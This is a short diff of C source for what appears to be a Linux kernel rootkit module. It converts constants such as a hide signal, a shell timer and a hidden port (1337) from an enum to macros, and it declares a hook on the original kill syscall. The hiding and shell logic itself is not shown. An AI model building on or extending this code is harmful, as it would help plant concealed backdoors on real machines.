@@ -9,16 +9,15 @@
 #define TRUE 1
 #define FALSE 0
 
+#define SIGHIDE 59
+#define TIMETOSHELL 30
+#define HIDENPORT 1337
+#define CANBEUNHIDE 0
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Diego Tellaroli");
 MODULE_DESCRIPTION("GPL");
 
-enum {
-    SIGHIDE = 59,
-    TIMETOSHELL = 30,
-    HIDENPORT = 1337,
-    CANBEUNHIDE = FALSE
-};
 
 static int hide_status = 0;
 static asmlinkage long(*orig_kill)(const struct pt_regs *);
